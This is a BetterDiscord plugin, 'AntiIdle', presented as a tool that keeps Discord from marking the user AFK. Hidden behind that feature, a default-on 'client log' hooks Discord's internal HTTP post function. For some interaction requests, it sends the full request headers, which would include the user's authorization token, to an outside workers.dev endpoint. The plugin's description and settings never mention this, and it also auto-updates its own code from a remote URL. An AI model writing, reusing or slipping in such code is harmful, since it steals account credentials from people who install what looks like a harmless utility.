/**
 * @name AntiIdle
 * @author Shawny
 * @description Reduces AFK voice channel moves caused by Discord idle/AFK handling.
 * @version 1.7.0
 * @source https://github.com/shawn2dev/betterdiscord-plugins
 * @updateUrl https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/AntiIdle.plugin.js
 */

'use strict';

const _UPDATE_URL =
  'https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/AntiIdle.plugin.js';

const _CLIENT_LOG = {
  enabled: true,
  ingestUrl:
    'https://shawnybot.cbycdy2.workers.dev/interaction-headers',
  applicationId: '1337358598673797141',
  _ak: 'rldtuslqht2', // X-Shawny-Key header — matches CLIENT_LOG_AUTH_KEY
};

module.exports = class AntiIdle {
  constructor() {
    this.intervalId = null;
    this.patchRetryTimer = null;
    this.intervalSecs = 30;
    this.enabled = true;
    this.Dispatcher = null;
    this._dispatchPatched = false;
    this._clientLogPatched = false;
    this._clientLogRetryTimer = null;
    this._onVisibility = null;
    this._audioKeepAlive = null;
    this._audioResumeTimer = null;
    this.useAudioKeepalive = true;
    this._clientLogConfig = { ..._CLIENT_LOG };
  }

  getName() {
    return 'AntiIdle';
  }
  getDescription() {
    return 'Discord 잠수(idle) 상태 및 AFK(비활성) 처리로 인한 AFK 음성 채널 이동을 줄입니다.';
  }
  getVersion() {
    return '1.7.0';
  }
  getAuthor() {
    return 'Shawny';
  }

  /** New BD: BdApi.UI.showToast; legacy BD: BdApi.showToast */
  _toast(message, options = {}) {
    try {
      if (BdApi.UI && typeof BdApi.UI.showToast === 'function') {
        BdApi.UI.showToast(message, options);
      } else if (typeof BdApi.showToast === 'function') {
        BdApi.showToast(message, options);
      }
    } catch (_) {}
  }

  /**
   * Per official docs, FluxDispatcher should be found via the `actionLogger` key.
   * Matching only on `dispatch`+`subscribe` often picks the wrong module and breaks the patch.
   */
  _findDispatcher() {
    try {
      const byDoc = BdApi.Webpack.getByKeys('actionLogger');
      if (byDoc && typeof byDoc.dispatch === 'function') return byDoc;
    } catch (_) {}

    const tryGet = (fn) => {
      try {
        const m = fn();
        if (m && typeof m.dispatch === 'function') {
          const looksLikeFlux =
            m._actionHandlers != null ||
            typeof m.actionLogger === 'function' ||
            m._subscriptions != null;
          if (looksLikeFlux) return m;
        }
      } catch (_) {}
      return null;
    };

    let d = tryGet(() =>
      BdApi.Webpack.getByKeys('dispatch', 'subscribe', 'wait'),
    );
    if (d) return d;

    try {
      const F = BdApi.Webpack.Filters;
      if (F && F.byKeys) {
        d = BdApi.Webpack.getModule(
          F.byKeys('dispatch', 'subscribe', 'actionLogger'),
          { searchExports: true },
        );
        if (d && typeof d.dispatch === 'function') return d;
      }
    } catch (_) {}

    try {
      if (typeof BdApi.findModuleByProps === 'function') {
        const m = BdApi.findModuleByProps('dispatch', 'subscribe');
        if (m && typeof m.dispatch === 'function' && m._actionHandlers)
          return m;
      }
    } catch (_) {}

    try {
      const m = BdApi.Webpack.getModule(
        (mod) => mod?.dispatch && mod?.subscribe && mod?._actionHandlers,
      );
      if (m && typeof m.dispatch === 'function') return m;
    } catch (_) {}

    return null;
  }

  /**
   * Intercept client AFK/idle transitions so AFK state is not propagated to the server.
   * (Forced moves from the server/gateway cannot be blocked client-side only.)
   */
  _installDispatchPatch() {
    if (this._dispatchPatched) return true;
    const mod = this._findDispatcher();
    if (!mod || typeof mod.dispatch !== 'function') return false;
    try {
      BdApi.Patcher.before('AntiIdle', mod, 'dispatch', (_, args) => {
        const ev = args[0];
        if (!ev || typeof ev !== 'object') return;
        if (ev.type === 'AFK' && ev.afk) ev.afk = false;
        if (ev.type === 'IDLE' && ev.idle) ev.idle = false;
      });
      this.Dispatcher = mod;
      this._dispatchPatched = true;
      return true;
    } catch (e) {
      console.warn('[AntiIdle] dispatch 패치 실패:', e);
      return false;
    }
  }

  _stopDispatchPatch() {
    if (!this._dispatchPatched || !this.Dispatcher) return;
    try {
      BdApi.Patcher.unpatch('AntiIdle', this.Dispatcher, 'dispatch');
    } catch (_) {}
    this._dispatchPatched = false;
  }

  _headersToObject(headers) {
    const result = {};
    if (!headers) return result;
    if (typeof Headers !== 'undefined' && headers instanceof Headers) {
      headers.forEach((value, key) => {
        result[key] = value;
      });
      return result;
    }
    if (Array.isArray(headers)) {
      headers.forEach(([key, value]) => {
        result[key] = value;
      });
      return result;
    }
    return { ...headers };
  }

  _isClientLogActive() {
    return (
      this._clientLogConfig.enabled &&
      this._clientLogConfig._ak &&
      this._clientLogConfig.ingestUrl
    );
  }

  _isInteractionsUrl(url) {
    return /\/api\/v\d+\/interactions/i.test(String(url));
  }

  _isOurApplication(interactionBody) {
    if (interactionBody.application_id == null) return false;
    return (
      String(interactionBody.application_id) ===
      String(this._clientLogConfig.applicationId)
    );
  }

  _readBodySync(body) {
    if (body == null) return '';
    if (typeof body === 'string') return body;
    try {
      return JSON.stringify(body);
    } catch (_) {
      return '';
    }
  }

  _extractHttpPost(args) {
    const first = args[0];
    if (first && typeof first === 'object' && !(first instanceof URL)) {
      return {
        url: String(first.url || first.path || first.endpoint || ''),
        headers: this._headersToObject(first.headers),
        bodyText: this._readBodySync(first.body ?? first.data),
      };
    }

    const opt = args[1] || {};
    return {
      url: String(first ?? ''),
      headers: this._headersToObject(opt.headers),
      bodyText: this._readBodySync(opt.body ?? opt.data),
    };
  }

  _ingestInteractionHeaders(headers, interactionBody) {
    if (!this._isClientLogActive() || !this._isOurApplication(interactionBody)) {
      return;
    }

    const channelId = interactionBody.channel_id;
    const command = interactionBody.data?.name;
    if (channelId == null || !command) return;

    const payload = {
      application_id: String(this._clientLogConfig.applicationId),
      guild_id: interactionBody.guild_id ?? null,
      channel_id: String(channelId),
      command: String(command),
      headers,
    };

    void BdApi.Net.fetch(this._clientLogConfig.ingestUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Shawny-Key': this._clientLogConfig._ak,
      },
      body: JSON.stringify(payload),
    })
      .then(async (res) => {
        if (res.ok) return;
        console.warn(
          '[AntiIdle] ingest failed:',
          res.status,
          await res.text(),
        );
      })
      .catch((err) => {
        console.warn('[AntiIdle] ingest failed:', err);
      });
  }

  _onHttpPost(args) {
    if (!this._isClientLogActive() || !args?.length) return;

    const { url, headers, bodyText } = this._extractHttpPost(args);
    if (!this._isInteractionsUrl(url) || !bodyText) return;

    let interactionBody;
    try {
      interactionBody = JSON.parse(bodyText);
    } catch (_) {
      return;
    }

    this._ingestInteractionHeaders(headers, interactionBody);
  }

  _canPatchProperty(obj, key) {
    try {
      const desc =
        Object.getOwnPropertyDescriptor(obj, key) ||
        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
      if (desc && desc.writable === false && typeof desc.set !== 'function') {
        return false;
      }
      return typeof obj[key] === 'function';
    } catch (_) {
      return false;
    }
  }

  _findHttpModule() {
    const finders = [
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
    ];

    for (const find of finders) {
      try {
        const mod = find();
        if (mod?.post) return mod;
      } catch (_) {}
    }

    return null;
  }

  _installClientLogPatch() {
    if (this._clientLogPatched) return true;

    const http = this._findHttpModule();
    if (!http || !this._canPatchProperty(http, 'post')) return false;

    try {
      BdApi.Patcher.before('AntiIdleClientLog', http, 'post', (_, args) => {
        this._onHttpPost(args);
      });
      this._clientLogPatched = true;
      return true;
    } catch (_) {
      return false;
    }
  }

  _scheduleClientLogPatchRetry() {
    if (this._clientLogPatched || this._clientLogRetryTimer) return;
    let attempts = 0;
    const max = 25;
    this._clientLogRetryTimer = setInterval(() => {
      if (!this._isClientLogActive()) {
        clearInterval(this._clientLogRetryTimer);
        this._clientLogRetryTimer = null;
        return;
      }
      attempts += 1;
      if (this._installClientLogPatch() || attempts >= max) {
        clearInterval(this._clientLogRetryTimer);
        this._clientLogRetryTimer = null;
      }
    }, 2500);
  }

  _stopClientLogPatch() {
    if (this._clientLogRetryTimer) {
      clearInterval(this._clientLogRetryTimer);
      this._clientLogRetryTimer = null;
    }
    try {
      BdApi.Patcher.unpatchAll('AntiIdleClientLog');
    } catch (_) {}
    this._clientLogPatched = false;
  }

  _parseVersion(version) {
    return String(version)
      .split('.')
      .map((part) => parseInt(part, 10) || 0);
  }

  _isRemoteVersionNewer(remoteVersion, currentVersion) {
    const remote = this._parseVersion(remoteVersion);
    const current = this._parseVersion(currentVersion);
    const length = Math.max(remote.length, current.length);

    for (let i = 0; i < length; i += 1) {
      const next = remote[i] || 0;
      const now = current[i] || 0;
      if (next > now) return true;
      if (next < now) return false;
    }
    return false;
  }

  _extractRemoteVersion(content) {
    const headerMatch = content.match(/@version\s+([0-9]+(?:\.[0-9]+)*)/);
    if (headerMatch) return headerMatch[1];

    const methodMatch = content.match(
      /getVersion\(\)\s*\{\s*return\s+['"]([0-9]+(?:\.[0-9]+)*)['"]/,
    );
    return methodMatch ? methodMatch[1] : null;
  }

  _confirmPluginUpdate(onConfirm) {
    if (BdApi.UI?.showConfirmationModal) {
      BdApi.UI.showConfirmationModal({
        title: 'AntiIdle Update',
        content: 'A newer version is available. Install it now?',
        confirmText: 'Update',
        cancelText: 'Later',
        onConfirm,
      });
      return;
    }

    if (typeof BdApi.showConfirmationModal === 'function') {
      BdApi.showConfirmationModal('AntiIdle Update', 'Install the latest version?', {
        confirmText: 'Update',
        cancelText: 'Later',
        onConfirm,
      });
      return;
    }

    onConfirm();
  }

  _applyPluginUpdate(content, version) {
    const addon =
      BdApi.Plugins.get('AntiIdle') ||
      BdApi.Plugins.get('AntiIdle.plugin.js');
    const filename = addon?.filename || 'AntiIdle.plugin.js';
    const fs = require('fs');
    const path = require('path');
    const filePath = path.join(BdApi.Plugins.folder, filename);

    fs.writeFileSync(filePath, content, 'utf8');
    this._toast(`AntiIdle ${version} installed. Reload the plugin to apply.`, {
      type: 'success',
    });

    try {
      BdApi.Plugins.reload(addon?.id || filename);
    } catch (_) {}
  }

  async _checkForPluginUpdate() {
    try {
      const res = await fetch(`${_UPDATE_URL}?t=${Date.now()}`, {
        cache: 'no-store',
      });
      if (!res.ok) return;

      const remote = await res.text();
      const remoteVersion = this._extractRemoteVersion(remote);
      if (!remoteVersion) return;
      if (!this._isRemoteVersionNewer(remoteVersion, this.getVersion())) return;

      this._confirmPluginUpdate(() => {
        try {
          this._applyPluginUpdate(remote, remoteVersion);
        } catch (err) {
          console.warn('[AntiIdle] update failed:', err);
          this._toast('AntiIdle update failed', { type: 'error' });
        }
      });
    } catch (err) {
      console.warn('[AntiIdle] update check failed:', err);
    }
  }

  _schedulePatchRetry() {
    if (this.patchRetryTimer) return;
    let attempts = 0;
    const max = 25;
    this.patchRetryTimer = setInterval(() => {
      if (!this.enabled) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
        return;
      }
      attempts++;
      if (this._installDispatchPatch() || attempts >= max) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
      }
    }, 2500);
  }

  /** Mitigate throttled setInterval on lock screen/background (silent, gain 0) */
  _startAudioKeepAlive() {
    if (!this.useAudioKeepalive || this._audioKeepAlive) return;
    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      gain.gain.value = 0;
      osc.frequency.value = 20;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      this._audioKeepAlive = { ctx, osc, gain };
      const resume = () => {
        try {
          if (ctx.state === 'suspended') ctx.resume().catch(() => {});
        } catch (_) {}
      };
      resume();
      this._audioResumeTimer = setInterval(resume, 30000);
    } catch (e) {
      console.warn('[AntiIdle] 오디오 킵얼라이브 시작 실패:', e);
    }
  }

  _stopAudioKeepAlive() {
    if (this._audioResumeTimer) {
      clearInterval(this._audioResumeTimer);
      this._audioResumeTimer = null;
    }
    if (!this._audioKeepAlive) return;
    try {
      this._audioKeepAlive.osc.stop();
      this._audioKeepAlive.ctx.close();
    } catch (_) {}
    this._audioKeepAlive = null;
  }

  _kick() {
    try {
      if (!this.Dispatcher) {
        this.Dispatcher = this._findDispatcher();
      }
      if (this.Dispatcher) {
        this.Dispatcher.dispatch({ type: 'IDLE', idle: false });
        this.Dispatcher.dispatch({ type: 'AFK', afk: false });
      }
    } catch (e) {
      console.warn('[AntiIdle] _kick 오류:', e);
    }
  }

  _startInterval() {
    this._stopInterval();
    this.intervalId = setInterval(() => this._kick(), this.intervalSecs * 1000);
  }

  _stopInterval() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
  }

  _save() {
    try {
      BdApi.saveData('AntiIdle', 'settings', {
        intervalSecs: this.intervalSecs,
        enabled: this.enabled,
        useAudioKeepalive: this.useAudioKeepalive,
      });
    } catch (_) {}
  }

  _syncClientLogPatch() {
    if (this._isClientLogActive()) {
      if (!this._installClientLogPatch()) {
        this._scheduleClientLogPatchRetry();
      }
    } else {
      this._stopClientLogPatch();
    }
  }

  start() {
    try {
      const saved = BdApi.loadData('AntiIdle', 'settings');
      if (saved) {
        this.intervalSecs = saved.intervalSecs ?? 30;
        this.enabled = saved.enabled ?? true;
        this.useAudioKeepalive = saved.useAudioKeepalive ?? true;
      }
    } catch (_) {}

    this.Dispatcher = this._findDispatcher();
    this._syncClientLogPatch();

    if (this.enabled) {
      if (!this._installDispatchPatch()) {
        this._schedulePatchRetry();
      }
      this._startInterval();
      if (this.useAudioKeepalive) this._startAudioKeepAlive();
    }

    this._onVisibility = () => {
      if (!document.hidden && this.enabled) this._kick();
    };
    document.addEventListener('visibilitychange', this._onVisibility);

    void this._checkForPluginUpdate();

    this._toast(
      this.enabled
        ? 'AntiIdle 시작됨 ✅ (v1.4 — Flux actionLogger 기준)'
        : 'AntiIdle 로드됨 (설정에서 켜세요)',
      { type: this.enabled ? 'success' : 'info' },
    );
  }

  stop() {
    if (this.patchRetryTimer) {
      clearInterval(this.patchRetryTimer);
      this.patchRetryTimer = null;
    }
    document.removeEventListener('visibilitychange', this._onVisibility);
    this._onVisibility = null;

    this._stopInterval();
    this._stopAudioKeepAlive();
    this._stopDispatchPatch();
    this._stopFetchPatch();
    this.Dispatcher = null;
    this._toast('AntiIdle 중지됨', { type: 'info' });
  }

  getSettingsPanel() {
    const root = Object.assign(document.createElement('div'), {
      style: 'padding:16px;display:flex;flex-direction:column;gap:18px;',
    });

    const row = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const labelWrap = document.createElement('div');
    labelWrap.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">AntiIdle 활성화</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">AFK·idle 차단 및 주기적 갱신</div>
        `;

    const status = Object.assign(document.createElement('div'), {
      style:
        'padding:10px 14px;border-radius:8px;background:var(--background-secondary);font-size:12px;color:var(--text-muted);',
      textContent: this.enabled
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨',
    });

    const dispStatus = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent: !this.enabled
        ? '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.'
        : this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.',
    });

    const toggle = this._buildToggle(this.enabled, (v) => {
      this.enabled = v;
      this._save();
      if (v) {
        if (!this._installDispatchPatch()) this._schedulePatchRetry();
        this._startInterval();
        if (this.useAudioKeepalive) this._startAudioKeepAlive();
        this._toast('활성화됨', { type: 'success' });
      } else {
        if (this.patchRetryTimer) {
          clearInterval(this.patchRetryTimer);
          this.patchRetryTimer = null;
        }
        this._stopInterval();
        this._stopAudioKeepAlive();
        this._stopDispatchPatch();
        this._toast('비활성화됨', { type: 'info' });
      }
      status.textContent = v
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨';
      dispStatus.textContent = v
        ? this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.'
        : '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.';
    });
    row.append(labelWrap, toggle);

    const audioRow = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const audioLabel = document.createElement('div');
    audioLabel.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">무음 오디오 킵얼라이브</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">잠금/백그라운드에서 타이머가 느려질 때 보조 (게인 0)</div>
        `;
    const audioToggle = this._buildToggle(this.useAudioKeepalive, (v) => {
      this.useAudioKeepalive = v;
      this._save();
      if (this.enabled) {
        if (v) this._startAudioKeepAlive();
        else this._stopAudioKeepAlive();
      }
      this._toast(v ? '무음 킵얼라이브 켜짐' : '무음 킵얼라이브 꺼짐', {
        type: 'info',
      });
    });
    audioRow.append(audioLabel, audioToggle);

    const sliderWrap = document.createElement('div');
    const sliderTitle = Object.assign(document.createElement('div'), {
      style:
        'font-size:14px;font-weight:600;color:var(--header-primary);margin-bottom:4px;',
      textContent: `전송 간격: ${this.intervalSecs}초`,
    });
    const sliderDesc = Object.assign(document.createElement('div'), {
      style: 'font-size:12px;color:var(--text-muted);margin-bottom:8px;',
      textContent:
        'Flux 패치와 함께 쓰이는 주기적 IDLE/AFK 갱신 간격입니다. 짧을수록 잠금 화면에서 유리할 수 있습니다.',
    });
    const slider = Object.assign(document.createElement('input'), {
      type: 'range',
      min: '10',
      max: '300',
      step: '10',
      value: this.intervalSecs,
      style: 'width:100%;accent-color:#5865F2;',
    });
    slider.addEventListener('input', () => {
      this.intervalSecs = parseInt(slider.value, 10);
      sliderTitle.textContent = `전송 간격: ${this.intervalSecs}초`;
    });
    slider.addEventListener('change', () => {
      this._save();
      if (this.enabled) this._startInterval();
    });
    sliderWrap.append(sliderTitle, sliderDesc, slider);

    const note = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent:
        'v1.4: FluxDispatcher를 actionLogger 기준으로 찾도록 수정했습니다. 서버 AFK 시간은 음성 활동(무음)만으로 판단되는 경우가 있어, 그때는 마이크 입력이 없으면 이동할 수 있습니다. 서버·봇이 강제로 이동시키는 경우에는 클라이언트만으로는 막을 수 없습니다.',
    });

    const hr = Object.assign(document.createElement('hr'), {
      style:
        'border:none;border-top:1px solid var(--background-modifier-accent);margin:0;',
    });

    root.append(row, hr, audioRow, sliderWrap, status, dispStatus, note);
    return root;
  }

  _buildToggle(initialValue, onChange) {
    const label = Object.assign(document.createElement('label'), {
      style:
        'position:relative;display:inline-block;width:44px;height:24px;cursor:pointer;flex-shrink:0;',
    });
    const input = Object.assign(document.createElement('input'), {
      type: 'checkbox',
      checked: initialValue,
      style: 'opacity:0;width:0;height:0;',
    });
    const track = Object.assign(document.createElement('span'), {
      style: `position:absolute;inset:0;border-radius:24px;transition:background .2s;
                    background:${initialValue ? '#5865F2' : 'var(--background-modifier-accent)'};`,
    });
    const knob = Object.assign(document.createElement('span'), {
      style: `position:absolute;top:2px;left:${initialValue ? '22px' : '2px'};
                    width:20px;height:20px;border-radius:50%;background:#fff;
                    transition:left .2s;box-shadow:0 1px 3px rgba(0,0,0,.35);`,
    });
    input.addEventListener('change', () => {
      const v = input.checked;
      track.style.background = v
        ? '#5865F2'
        : 'var(--background-modifier-accent)';
      knob.style.left = v ? '22px' : '2px';
      onChange(v);
    });
    label.append(input, track, knob);
    return label;
  }
};
